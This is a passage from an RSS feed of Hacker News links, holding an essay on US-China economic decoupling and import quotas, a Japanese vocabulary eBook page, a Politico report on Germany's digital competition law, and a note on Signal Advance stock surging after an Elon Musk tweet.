<p><span><img src="https://www.purpose.jobs/hs-fs/hubfs/Me%20Creative%20Mornings.jpg?width=265&amp;name=Me%20Creative%20Mornings.jpg" alt="Me Creative Mornings" width="265" srcset="https://www.purpose.jobs/hs-fs/hubfs/Me%20Creative%20Mornings.jpg?width=133&amp;name=Me%20Creative%20Mornings.jpg 133w, https://www.purpose.jobs/hs-fs/hubfs/Me%20Creative%20Mornings.jpg?width=265&amp;name=Me%20Creative%20Mornings.jpg 265w, https://www.purpose.jobs/hs-fs/hubfs/Me%20Creative%20Mornings.jpg?width=398&amp;name=Me%20Creative%20Mornings.jpg 398w, https://www.purpose.jobs/hs-fs/hubfs/Me%20Creative%20Mornings.jpg?width=530&amp;name=Me%20Creative%20Mornings.jpg 530w, https://www.purpose.jobs/hs-fs/hubfs/Me%20Creative%20Mornings.jpg?width=663&amp;name=Me%20Creative%20Mornings.jpg 663w, https://www.purpose.jobs/hs-fs/hubfs/Me%20Creative%20Mornings.jpg?width=795&amp;name=Me%20Creative%20Mornings.jpg 795w" sizes="(max-width: 265px) 100vw, 265px"></span></p>
<p>Ryan is a leadership coach to entrepreneurs, the founder of <a href="https://www.leadinsideout.io/" rel="noopener" target="_blank"><span>Inside Out Leadership</span></a>, and a serial entrepreneur.&nbsp; He has helped leaders from dozens of companies design a more conscious life, and make key changes to improve their performance and satisfaction.&nbsp;<span></span></p>
<p>Previously, as a 3x founder/CEO, Ryan scaled companies to over 11-million users across 45 states, raised over $20m from leading VCs, built teams of nearly 100 world-class employees, and acquired or partnered with nearly a dozen companies.</p>
<p><span>If you are interested in accelerating your growth as a leader, <a href="https://www.leadinsideout.io/contact" rel="noopener" target="_blank">reach out to Ryan here</a>. And if you liked this article, you can find more of Ryan's work at <a href="https://www.secondmountainstartup.com/" rel="noopener" target="_blank">Second Mountain Startup</a>, the popular weekly newsletter for purpose-driven entrepreneurs.<br></span></p>

<p><strong>Looking to grow your startup team? Post jobs and start finding the right candidates.&nbsp;</strong><span><!--HubSpot Call-to-Action Code --><span id="hs-cta-wrapper-4bfa3235-435c-4dc9-9c72-7100dcb8f222"><span id="hs-cta-4bfa3235-435c-4dc9-9c72-7100dcb8f222"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/2873777/4bfa3235-435c-4dc9-9c72-7100dcb8f222" target="_blank"><img id="hs-cta-img-4bfa3235-435c-4dc9-9c72-7100dcb8f222" src="https://no-cache.hubspot.com/cta/default/2873777/4bfa3235-435c-4dc9-9c72-7100dcb8f222.png" alt="POST JOBS FOR FREE"></a></span></span><!-- end HubSpot Call-to-Action Code --></span></p></span>
</p>

</div></div>]]>
            </description>
            <link>https://www.purpose.jobs/blog/why-most-culture-work-actually-hurts-your-company</link>
            <guid isPermaLink="false">hacker-news-small-sites-25791209</guid>
            <pubDate>Fri, 15 Jan 2021 14:20:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Economics of Decoupling (including: Chaos Monkey for supply chains?)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25791102">thread link</a>) | @leopold_a
<br/>
January 15, 2021 | https://www.forourposterity.com/the-economics-of-decoupling/ | <a href="https://web.archive.org/web/*/https://www.forourposterity.com/the-economics-of-decoupling/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>America finds herself in a peculiar position. At the same time that she is in an increasingly tense geopolitical standoff with China, her economy remains deeply dependent on China for everything from pharmaceuticals to high-tech computing.</p><p>This disconnect between political and economic realms has led to increasing calls for “decoupling”: disentangling the economic ties between the US and China. Classical liberals and economists tend to instinctively recoil at such suggestions. Not only is the economic logic of free trade unassailable, they claim, but economic entanglement helps prevent war as well.</p><p>But as the prospect of US-China war becomes ever-less remote, it is worth taking seriously the security vulnerability that comes with America’s dependence on China. If war were to erupt, could China cut the US off from essential resources and goods, suffocating not only America’s economy but her war effort itself? The US’s inability to produce N95 masks during the pandemic—because <a href="https://palladiummag.com/2020/03/22/digital-salon-with-william-eden-and-matt-parlmer-coronavirus-response/">most of the world’s polypropylene</a> production is in China—provides just a taste of what this could be like.</p><p>A liberalism that clings too unreservedly to the ideals of free trade will be a liberalism unable to defend itself. The few percentage points of GDP we gain by offshoring production to China is dwarfed by the catastrophe that would be losing WWIII. And as demonstrated by Japan’s dependence on the US before WWII, economic dependence doesn’t even necessarily deter war—in fact, dependence could spur war.</p><p>But “decoupling” is no more than a buzzword. The US’s economic entanglement with China is decades in the making and would be impossible to unravel overnight. Nor is simply reducing the gross volume of imports the right goal. Rather, we should systematically address the specific security vulnerability our economic dependence on China creates. Should it come to war, America’s supply chains must be robust enough to do without Chinese imports—even if the war is long and general.</p><p>Addressing this security vulnerability would require long-run investments in the capabilities and physical factory capacity to produce many vital goods domestically. (Or in allied countries, but I will omit this caveat henceforth for simplicity.) The question is, how to incentivize this adjustment process?</p><p>Ideally, we could directly target the “security externality” of trade. But we run into a fundamental informational problem. In the complex web of modern supply chains, how do we know which imports create vulnerability? While for some imports this may be obvious, there might also be “Achilles’ heel” imports: random, $5 components that nobody thinks about, but that turn out to be essential, and for which the production expertise and facilities do not exist in the United States.</p><p>The “decouplers” seem to retreat to the canonical approach to trade restriction: tariffs. The problem with tariffs, however, is that they are royally ineffective at reducing the security vulnerability we are concerned about. A general tariff incentivizes onshoring the production that is cheapest and easiest to onshore—but it is likely the imports for which onshoring would be the most expensive and difficult that present the greatest security vulnerability, as I will explain. In the language of economics, I argue that the imports that present the greatest security vulnerability are those with the most inelastic import demand—while a general tariff most reduces those imports with the most elastic import demand.</p><p>I propose an alternative approach: general per-product quotas. These would better target vulnerability than a general tariff. Perhaps even more importantly, this mechanism would reveal critical information about which imports are associated with the greatest vulnerability. Using this information, the government could then directly tax this vulnerability or subsidize domestic production alternatives. In that sense, the per-product quotas could function as a “stress test” of the robustness of American supply chains to disruptions in the flow of Chinese imports.</p><p>Note that even if you disagree with the premise that we ought to “decouple,” I invite you to consider this economic question. Whether you like it or not, decoupling may become the political mandate—and so, as economists, we ought to figure out how to best execute on that political mandate (rather than hiding behind the dogma “but free trade is good!”).</p><h2 id="conceptualizing-the-security-vulnerability">Conceptualizing the Security Vulnerability</h2><p>Suppose the imports of a certain good were completely cut off. How bad would that be? That is what I shall term the “vulnerability” associated with importing that good.</p><p>Vulnerability depends on two factors:</p><ul><li>1) How essential the good is, and</li><li>2) How difficult replacing the import with domestic production would be.</li></ul><p>If suddenly our supply of nonessential goods—say, random gizmos like Rubik’s cubes—were cut off, that would be a bummer. But losing access to Rubik’s cubes would not be of greater relevance for the US economy or a potential war effort. By contrast, a critical component in microchip production would be more essential, for example.</p><p>Some imports may be essential, but the imports may be easily substituted by domestic production if necessary. For these goods, we might as well harvest the cost savings of offshoring during peacetime, and if necessary we could switch to emergency domestic production.</p><p>The imports we really should be worried about on security vulnerability grounds are those that are both essential <em>and</em> difficult to replace with domestic production. These might be imports like rare earths. If our rare earth supply were cut off, that could arrest our ability to procure new computer systems—and it would likely also be expensive, time-consuming, and difficult to establish alternative domestic production.</p><p>Critically, the degree of vulnerability associated with an import—whether it is nonessential or essential, whether it easily substituted by domestic production or not—is not reflected in its price. The dollar volume of rare earth imports from China is a fraction of the dollar volume of toy imports from China, for example. So we cannot measure the success of “decoupling” by simply looking the dollar volume of trade.</p><h2 id="the-security-vulnerability-in-economic-terms">The Security Vulnerability in Economic Terms</h2><p>We can put our conception of vulnerability in the language of economics by thinking about elasticities. In particular, vulnerability will correspond to inelastic import demand.</p><p>Consider first the two component factors of vulnerability mentioned above.</p><p><strong>Essentiality: Elasticity of General Demand </strong></p><p>The first factor, the essentiality of a good, corresponds to the elasticity of <em>general demand</em> (i.e. demand for the good regardless of source, whether foreign or domestic). The more inelastic general demand, the more buyers are willing to pay to continue procuring the good, so the more essential it is. If a good is nonessential, the more elastic general demand will be, as buyers would just forgo using that good altogether if the price got too high.</p><p><strong>Substitutability with Domestic Production: Elasticity of Domestic Supply</strong></p><p>The second factor, the difficulty of replacing the import with domestic production, corresponds to the elasticity of <em>domestic supply</em> of that good. The more elastic domestic supply, the easier and cheaper it would be to purchase more of this good domestically. Whereas inelastic domestic supply corresponds to it being expensive and difficult to procure this good domestically.</p><p>To be sure, some imports may be expensive to onshore (i.e. have inelastic domestic supply) simply because of labor costs, not because the US doesn’t have the capacity to make these goods in an emergency. But with respect to China, the view that offshoring is primarily about labor costs is outdated. As Steve Jobs <a href="https://www.nytimes.com/2012/01/22/business/apple-america-and-a-squeezed-middle-class.html">once told</a> Obama, iPhones are made in China not because of labor costs but because only China has the requisite manufacturing expertise and the vast industrial scale.</p><p><strong>Vulnerability: Elasticity of Import Demand</strong></p><p>It turns out that the combination of these factors—i.e., vulnerability itself—is captured by the elasticity of <em>import demand</em> for the good (i.e., the demand for the good solely from foreign, not domestic, sources). <em>The more inelastic the import demand for a good, the higher the vulnerability associated with importing that good.</em></p><p>To see this, note that the elasticity of import demand captures both the elasticities of general demand and domestic supply. The elasticity of <em>import demand</em> will depend on the elasticity of <em>general demand</em>; if general demand is very elastic, then, straightforwardly, import demand will be very elastic too.</p><p>Critically, the elasticity of <em>import demand</em> will also depend on the elasticity of <em>domestic supply</em>. If domestic supply is very elastic, import demand will be very elastic as well, since buyers would just switch to acquiring the good domestically if the import got too expensive. Whereas if domestic supply is inelastic, there is little alternative to continuing to import the good, so import demand will be inelastic as well.</p><p>Thus, the import demand will be inelastic exactly when vulnerability is high—when the good is both essential (inelastic general demand) and the import is not easily substituted by domestic production (inelastic domestic supply).</p><p>Thus, to reduce the security vulnerability, we want to onshore those goods where the import demand is inelastic, while we care much less about those goods where the import demand is more elastic. Considering this elasticity helps clarify the effect of trade interventions.</p><h2 id="tariffs">Tariffs</h2><p>A tariff most reduces purchases for goods with elastic import demand—while barely touching the quantity of purchases of goods with inelastic import demand. A general tariff on imports from China (~what the Trump Administration did) thus most reduces the imports that present the <em>least</em> security vulnerability, while barely touching the imports that present the greatest security vulnerability.</p><p>To put it in …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.forourposterity.com/the-economics-of-decoupling/">https://www.forourposterity.com/the-economics-of-decoupling/</a></em></p>]]>
            </description>
            <link>https://www.forourposterity.com/the-economics-of-decoupling/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25791102</guid>
            <pubDate>Fri, 15 Jan 2021 14:11:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Learn JLPT-N3 Japanese Vocab with Pictures (eBook)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25790627">thread link</a>) | @mhay
<br/>
January 15, 2021 | https://www.kumalearn.com/ebooks/kumadex-jlpt-n3-25-words | <a href="https://web.archive.org/web/*/https://www.kumalearn.com/ebooks/kumadex-jlpt-n3-25-words">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2>A better way to send money.</h2><dl><div><p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9IiNmZmYiIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTkgMTJjMC0uNTUyLjQ0OC0xIDEuMDAxLTFzLjk5OS40NDguOTk5IDEtLjQ0NiAxLS45OTkgMS0xLjAwMS0uNDQ4LTEuMDAxLTF6bTYuMiAwbC0xLjcgMi42LTEuMy0xLjYtMy4yIDRoMTBsLTMuOC01em01LjgtN3YtMmgtMjF2MTVoMnYtMTNoMTl6bTMgMnYxNGgtMjB2LTE0aDIwem0tMiAyaC0xNnYxMGgxNnYtMTB6Ii8+PC9zdmc+" width="24" alt="Kuma Learn has thousands of words with pictures"></p><p><dt>3,000+ words with pictures</dt><dd>We've carefully hand-picked pictures for thousands of words for you, so that you can learn Japanese visually! We have the ambition to hand-pick pictures for many more thousands of words.</dd></p></div><div><p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9IiNmZmYiIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTggMTAuNWMwIC44MjctLjY3MyAxLjUtMS41IDEuNXMtMS41LS42NzMtMS41LTEuNS42NzMtMS41IDEuNS0xLjUgMS41LjY3MyAxLjUgMS41em0xNiA2LjIxNmMwIDEuNTg3LS41NiAyLjU5MS0xLjc0OSAzLjE3OS0uMTQzLjA3MS0uMjk2LjEwNS0uNDQ5LjEwNS0uMjQyIDAtLjQ4Mi0uMDg3LS42NzItLjI1NWwtMy4xMDktMi43NDVjLS41NTgtLjQ5NC0xLjA0NC0xLjAwNC0yLjQwNC0xLjAwNGgtNy4yMzNjLTEuMzYgMC0xLjg0Ny41MS0yLjQwNCAxLjAwNGwtMy4xMSAyLjc0NWMtLjE4OC4xNjgtLjQyOS4yNTUtLjY3Mi4yNTUtLjE1MiAwLS4zMDctLjAzNC0uNDQ5LS4xMDUtMS4xODktLjU4OC0xLjc0OS0xLjU5Mi0xLjc0OS0zLjE3OCAwLTIuMDYyLjk0NS01LjQ2MSAyLjY4MS05Ljg1Ny44MjItMi4wODMgMi4yOTItMi44NiAzLjY5NS0yLjg2LjY1NiAwIDEuMjk4LjE3IDEuODUzLjQ1NiAyLjQyNCAxLjI0OSA1LjE3IDEuMjIzIDcuNTQ0IDAgLjU1My0uMjg2IDEuMTk1LS40NTYgMS44NTEtLjQ1NiAxLjQwMyAwIDIuODc0Ljc3NyAzLjY5NiAyLjg2IDEuNzM1IDQuMzk1IDIuNjggNy43OTQgMi42OCA5Ljg1NnptLTE1LTYuMjE2YzAtMS4zODEtMS4xMTktMi41LTIuNS0yLjVzLTIuNSAxLjExOS0yLjUgMi41IDEuMTE5IDIuNSAyLjUgMi41IDIuNS0xLjExOSAyLjUtMi41em00LTIuNWMwLS41NTItLjQ0Ny0xLTEtMXMtMSAuNDQ4LTEgMSAuNDQ3IDEgMSAxIDEtLjQ0OCAxLTF6bTMuNSAyLjVjMC0uNDE1LS4zMzYtLjc1LS43NS0uNzVzLS43NS4zMzUtLjc1Ljc1LjMzNi43NS43NS43NS43NS0uMzM1Ljc1LS43NXptMS43NSAxLjc1YzAtLjQxNS0uMzM2LS43NS0uNzUtLjc1cy0uNzUuMzM1LS43NS43NS4zMzYuNzUuNzUuNzUuNzUtLjMzNS43NS0uNzV6bTAtMy41MzFjMC0uNDE1LS4zMzYtLjc1LS43NS0uNzVzLS43NS4zMzUtLjc1Ljc1LjMzNi43NS43NS43NS43NS0uMzM2Ljc1LS43NXptMS43MzQgMS43ODFjMC0uNDE1LS4zMzYtLjc1LS43NS0uNzVzLS43NS4zMzUtLjc1Ljc1LjMzNi43NS43NS43NS43NS0uMzM1Ljc1LS43NXoiLz48L3N2Zz4=" width="24" alt="Kuma Learn makes learning fun with games"></p><p><dt>Make learning fun!</dt><dd>Learning Japanese vocabulary with pictures certainly helps but we have plans to make it more fun by introducing games with pictures. Match words with pictures, guess a word from a picture and more!</dd></p></div><div><p><img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMjJweCIgaGVpZ2h0PSIyNHB4IiB2aWV3Qm94PSIwIDAgMjIgMjQiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8dGl0bGU+bGVhcm48L3RpdGxlPgogICAgPGcgaWQ9IlBhZ2UtMSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPGcgaWQ9ImxlYXJuIiBmaWxsPSIjRkZGRkZGIj4KICAgICAgICAgICAgPHBhdGggZD0iTTE0Ljk5NiwyMy45OTkgTDIuMzkxLDIzLjk5OSBDMi4zOTEsMjMuOTk5IDMuMTI1LDIwLjA2OCAzLjAyNCwxOC4zMTMgQzIuOTgzLDE3LjU4OSAyLjg2MywxNi44MzkgMi40ODQsMTYuMjA5IEMxLjgzOSwxNS4yMDkgLTAuMTUyLDEyLjQ4OSAwLjAwOSw4Ljc3OSBDMC4yMzMsMy41NyA0LjcwMiwwIDEwLjEzNSwwIEMxNS4yMzMsMCAxOC42NDIsMy4wMDEgMTkuOTkzLDcuNDgzIEMyMC4zMjEsOC41NjIgMjAuMzA0LDkuMDI0IDE5Ljg0MiwxMC4wOSBMMTkuODM2LDEwLjEwMyBMMjEuNTg3LDEyLjI0NSBDMjEuODQ3LDEyLjYyNiAyMiwxMy4wMzYgMjIsMTMuNDg0IEMyMiwxNC4wMzEgMjEuNzY3LDE0LjUyOSAyMS4zOSwxNC44ODMgQzIxLjAyMiwxNS4yMjggMjAuNjIzLDE1LjMzNSAyMC4xNDIsMTUuNTI1IEMyMC4xNDIsMTUuNTI1IDE5LjU2NiwxOC4xMTcgMTkuMjY5LDE4LjgxNiBDMTguNTY5LDIwLjQ1OSAxNy4yOTksMjAuNDc1IDE2LjI5OSwyMC42NjUgQzE1LjkwNSwyMC43NDggMTUuODA5LDIwLjc5OCAxNS42MTgsMjEuMzQ2IEMxNS40MSwyMS45MzcgMTUuMjU1LDIyLjc4MSAxNC45OTYsMjMuOTk5IE0xMC4xNTQsMS45OTkgQzUuODY5LDIuMDQ3IDIuNDE0LDQuNTQ3IDIuMDMzLDguNDg3IEMxLjg0MSwxMC40NzggMi40OTYsMTIuNDczIDMuNTQ5LDE0LjE5MiBDNC4xNiwxNS4xOTIgNC44NTQsMTUuNzg0IDUuMDEzLDE4LjA2NyBDNS4xMDQsMTkuMzggNC45NjMsMjAuNzAzIDQuNzcyLDIxLjk5OSBMMTMuMzc2LDIxLjk5OSBDMTMuNTE3LDIxLjM1NCAxMy43MjYsMjAuNTE0IDE0LjA2MywxOS45NDIgQzE0LjUxMiwxOS4xNzYgMTUuMTYsMTguODQzIDE1Ljk4OSwxOC42ODggQzE2LjgyNywxOC41NCAxNy4yMjcsMTguNjI5IDE3LjQ3OCwxNy45MDMgQzE3LjY5LDE3LjMyNCAxOC4wOSwxNS42ODIgMTguMzA5LDE0LjAwMSBDMTkuNTEyLDEzLjY2NiAxOC45MjEsMTMuODQgMTkuOTgsMTMuNDQyIEMxOS43NzQsMTMuMjA4IDE4LjA2MiwxMS4xMjggMTcuOTM1LDEwLjg0MiBDMTcuNTk5LDEwLjA4MyAxNy44ODksOS42NTIgMTguMTYsOC45MjkgQzE4LjI0Niw4LjY3OCAxOC4yMiw4LjU3MiAxOC4xNTEsOC4zMTYgQzE3LjEwMiw0LjM2NyAxNC4yNiwxLjk5OSAxMC4xNTQsMS45OTkgTTEwLjY3NCw0Ljk5OSBDMTAuOTE2LDUuNjgzIDEwLjk4Niw2LjEyMSAxMS41MTUsNi4zNCBMMTEuNTE2LDYuMzQgQzEyLjA0Niw2LjU2MSAxMi40MDksNi4yOTYgMTMuMDU5LDUuOTg3IEwxNC4wMTIsNi45MzkgQzEzLjcsNy41OTQgMTMuNDM5LDcuOTU1IDEzLjY1OCw4LjQ4MyBMMTMuNjU4LDguNDg0IEMxMy44NzcsOS4wMTIgMTQuMzExLDkuMDgxIDE1LDkuMzI1IEwxNSwxMC42NzIgQzE0LjMxOSwxMC45MTUgMTMuODc3LDEwLjk4NSAxMy42NTgsMTEuNTE1IEMxMy40MzgsMTIuMDQ0IDEzLjcwMSwxMi40MDYgMTQuMDEyLDEzLjA1OSBMMTMuMDU5LDE0LjAxMSBDMTIuNDAyLDEzLjY5OCAxMi4wNDUsMTMuNDM3IDExLjUxOCwxMy42NTYgTDExLjUxNywxMy42NTYgQzEwLjk4NiwxMy44NzggMTAuOTE2LDE0LjMxNyAxMC42NzQsMTQuOTk5IEw5LjMyNiwxNC45OTkgQzkuMDg0LDE0LjMxNSA5LjAxNCwxMy44NzcgOC40ODUsMTMuNjU5IEw4LjQ4NCwxMy42NTggQzcuOTU1LDEzLjQzNyA3LjU5MiwxMy43MDEgNi45NCwxNC4wMTEgTDUuOTg4LDEzLjA1OSBDNi4yOTMsMTIuNDE2IDYuNTYyLDEyLjA0OCA2LjM0MSwxMS41MTQgQzYuMTIxLDEwLjk4NSA1LjY4LDEwLjkxNSA1LDEwLjY3MiBMNSw5LjMyNSBDNS42ODEsOS4wODMgNi4xMjEsOS4wMTMgNi4zNDEsOC40ODQgQzYuNTYxLDcuOTUzIDYuMjk5LDcuNTkzIDUuOTg4LDYuOTM5IEw2Ljk0LDUuOTg3IEM3LjU5Nyw2LjI5OSA3Ljk1NSw2LjU2IDguNDg0LDYuMzQgTDguNDg1LDYuMzQgQzkuMDE0LDYuMTIxIDkuMDg0LDUuNjc5IDkuMzI2LDQuOTk5IEwxMC42NzQsNC45OTkgTDEwLjY3NCw0Ljk5OSBaIE0xMCwxMS42NjYgQzkuMDgsMTEuNjY2IDguMzMzLDEwLjkyIDguMzMzLDkuOTk5IEM4LjMzMyw5LjA3OCA5LjA4LDguMzMyIDEwLDguMzMyIEMxMC45Miw4LjMzMiAxMS42NjYsOS4wNzggMTEuNjY2LDkuOTk5IEMxMS42NjYsMTAuOTIgMTAuOTIsMTEuNjY2IDEwLDExLjY2NiIgaWQ9IlNoYXBlIj48L3BhdGg+CiAgICAgICAgPC9nPgogICAgPC9nPgo8L3N2Zz4=" width="24" alt="Kuma Learn helps you learn efficiently with Spaced Repetition System (SRS)"></p><p><dt>Spaced Repetition System (SRS)</dt><dd>Kuma Learn has plans to help you learn Japanese vocabulary efficiently with a Spaced Repetition System (SRS). You'll be shown words that you don't know more often; words know well you'll be shown only every so often.</dd></p></div></dl></div></div></div>]]>
            </description>
            <link>https://www.kumalearn.com/ebooks/kumadex-jlpt-n3-25-words</link>
            <guid isPermaLink="false">hacker-news-small-sites-25790627</guid>
            <pubDate>Fri, 15 Jan 2021 13:22:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Germany shows EU the way in curbing Big Tech]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25790385">thread link</a>) | @doener
<br/>
January 15, 2021 | https://www.politico.eu/article/germany-shows-eu-the-way-in-curbing-big-tech/ | <a href="https://web.archive.org/web/*/https://www.politico.eu/article/germany-shows-eu-the-way-in-curbing-big-tech/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									
<p>The German parliament on Thursday approved a reform of national competition law that would make Germany the first country in the world with preventative rules tailored to counter the market power of large digital platforms.</p>



<p>In moving forward quickly with the new constraints on Big Tech, Germany is increasing its leverage in the EU's development of a similar bloc-wide reforms that could end up replacing the German framework — but Berlin's approach also opens the door to legal challenges by the internet platforms.</p>



<p>Competition authorities traditionally can act only after a company has abused a dominant market position, which has proven a slow and ineffective way of dealing with anticompetitive behavior by digital giants. The <a href="https://www.politico.eu/?p=1573418">new framework</a> will put the German authority — the Bundeskartellamt — at the forefront when bringing in a new type of competition case, prohibiting<strong> </strong>abusive behavior before it takes place within markets where firms are not yet dominant.</p>



<p>The Bundeskartellamt could start compiling as of March a list of companies considered "of paramount significance on competition across markets." These companies will need to obey a set of rules, including the prohibition against giving preferential treatment to their own services or hindering interoperability with other services. </p>



<p>Falko Mohrs, a lawmaker with the Social Democrat party — who is steering the German reform — told POLITICO, "We see digital markets need new regulations, more proactive and efficient, when it comes to the big players."</p>



<p>German competition chief Andreas Mundt has highlighted how the coronavirus crisis amplifies<strong> </strong>the winner-takes-all dynamic on digital markets, with so-called gatekeeper platforms exerting outsized influence. "We really need to re-establish conditions for competitive options for companies outside the ecosystems of these huge digital companies," he said in November concerning the planned reform. </p>



<p>The bill was approved in the plenary of the Bundestag on Thursday morning, after a compromise between the country's three governing parties was reached late last week. It should still be approved by the Bundesrat, the legislative body representing Germany's states, but that is a formal step.</p>



<p>The vote comes weeks after the European Commission <a href="https://www.politico.eu/article/europe-digital-markets-act-services-act-tech-competition-rules-margrethe-vestager-thierry-breton/">proposed</a> a similar framework in its Digital Markets Act (DMA). For Germany, which has together with France been a <a href="https://www.politico.eu/article/eu-big-four-france-germany-italy-poland-press-executive-vice-president-margrethe-vestager-to-clear-path-for-champions/">driving force</a> behind the DMA, having its own rules in place means Berlin could apply more pressure on Brussels to improve — or at least not weaken — the EU proposal.</p>



<p>Germany wants national competition authorities, including the Bundeskartellamt, to have a coordinating role in the enforcement of the Digital Markets Act, said a person familiar with the German negotiating position. This is not foreseen in the Commission's proposal.</p>



<p>Mohrs said he would "definitely prefer a European approach. We hope <a href="https://www.politico.eu/wp-content/uploads/2021/01/13/German-Competition-Law-Reform-Compromise-Draft.pdf">this law</a> and its application can help inform the EU in its legislative process."</p>



<p>Asked if the German regime will be abandoned once the European rules enter into force, Mohrs said: "We will see if the Digital Markets Act will cover the practices at the same level of effectiveness as the [updated German law]."</p>



<p>“I assume that, at least at the beginning, Germany and the EU will try to find some compromise about sharing responsibility for the enforcement of rules applicable to large internet platforms in Europe,” said Clifford Chance competition lawyer Michael Dietrich.</p>



<h3>Platform pushback</h3>



<p>In its efforts to draw up a fast and functional framework, Germany may have left the platforms and their advisers with at least two&nbsp;big&nbsp;avenues to challenge enforcement of the measure.&nbsp;The first is the proposed expedited appeals process.&nbsp;</p>



<p>To prevent internet platforms from stretching out legal procedures, lawmakers want appeals against decisions under the new regime to go straight to the Federal Supreme Court in Karlsruhe, skipping the usual first step of the Higher Regional Court in Düsseldorf.</p>



<p>According to two German competition lawyers, such a shortened appeal procedure could be considered unconstitutional. The Supreme Court normally only reviews questions of law, but would operate in this case as the only instance when facts would be reviewed. And rights of defense would also be curtailed in front of the competition authority, where the burden of proof is shifted to the platforms, meaning they need to demonstrate that they did not break the law.</p>



<p>Keeping the German regime in place after the DMA enters into force also could expose Bundeskartellamt decisions to claims by the platforms that only the EU has jurisdiction to regulate gatekeepers.</p>



<p>The DMA seeks to harmonize gatekeeper rules across the bloc, saying that "Member States shall not impose on gatekeepers further obligations by way of laws, regulations or administrative action for the purpose of ensuring contestable and fair&nbsp;markets."  </p>



<p>While the EU is said to have come to an understanding with Germany that its regime is considered an extension of competition law and therefore exempted from the harmonization rule, legal experts agree that the German rules are at least a gray zone between competition law and regulation. </p>



<p>"In my view, you could well consider [the German regime] as regulation rather than competition law," said Romina Polley, a competition lawyer at Cleary Gottlieb who advises Google on the reform. </p>



<p>Polley argued that the German regime enables the competition authority to prohibit conduct<strong> </strong>by an online platform before it takes place without a detailed assessment of the platform's power on a specific market or the effects of its conduct, as is usual in antitrust cases. </p>



<p>"GAFA companies might claim in later proceedings against a prohibition under [the new German rules] that its legal basis conflicts with the EC’s exclusive jurisdiction," Polley said, referring to the tech giants. </p>







<p><em>This story has been updated to reflect the outcome of the parliament vote.</em> </p>




								</div></div>]]>
            </description>
            <link>https://www.politico.eu/article/germany-shows-eu-the-way-in-curbing-big-tech/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25790385</guid>
            <pubDate>Fri, 15 Jan 2021 12:55:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Two Words from Elon Musk send a stock up 527%]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25790370">thread link</a>) | @RickJWagner
<br/>
January 15, 2021 | https://compoundadvisors.com/2021/a-clear-signal-of-insanity | <a href="https://web.archive.org/web/*/https://compoundadvisors.com/2021/a-clear-signal-of-insanity">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
<p>There’s been a lot of <a href="https://compoundadvisors.com/2020/the-craziest-thing-in-markets-you-may-ever-see" target="_blank" rel="noreferrer noopener">crazy things</a> going on in markets lately, but this one may top them all.</p>



<p>Last Thursday morning, Elon Musk sent out this tweet to his 41 million followers…</p>



<figure><img loading="lazy" width="558" height="98" src="https://compoundadvisors.com/wp-content/uploads/2021/01/image-18.png" alt="" srcset="https://compoundadvisors.com/wp-content/uploads/2021/01/image-18.png 558w, https://compoundadvisors.com/wp-content/uploads/2021/01/image-18-300x53.png 300w" sizes="(max-width: 558px) 100vw, 558px"></figure>



<p>What’s Signal?</p>



<p>It’s a messaging app for your phone and an alternative to WhatsApp, which has been criticized recently for <a href="https://www.pcmag.com/news/elon-musk-tells-followers-to-use-signal-messaging-app-amid-whatsapp-privacy" target="_blank" rel="noreferrer noopener">privacy concerns</a> (sharing data with Facebook, its parent company).</p>



<p>As one might have guessed, the demand for Signal exploded after Musk’s tweet.</p>



<p>And as a result, traders naturally looked to the financial markets to see if they could profit from it.</p>



<p>In searching for Signal, what they found was a company called “Signal Advance.”</p>



<p>Are they one in the same?</p>



<p>Not exactly.</p>



<p>Signal Advance is a small company that has absolutely nothing to do with the <a href="https://en.wikipedia.org/wiki/Signal_(software)" target="_blank" rel="noreferrer noopener">nonprofit company called Signal</a> or its messaging app. </p>



<p>Did that stop traders from buying Signal Advance ($SIGL)?</p>



<p>Not at all.</p>



<p>It closed last Thursday (1/7) at $3.76, an increase of 527% from the day before the Musk tweet.</p>



<p>Did traders soon realize their mistake and reverse course?</p>



<p>No. Last Friday (1/8), it closed at $7.19, up another 91%. </p>



<p>Surely that was the end of it, right?</p>



<p>Nope. Today the stock hit a high of $70.85, a 118x increase from last Wednesday’s close.</p>



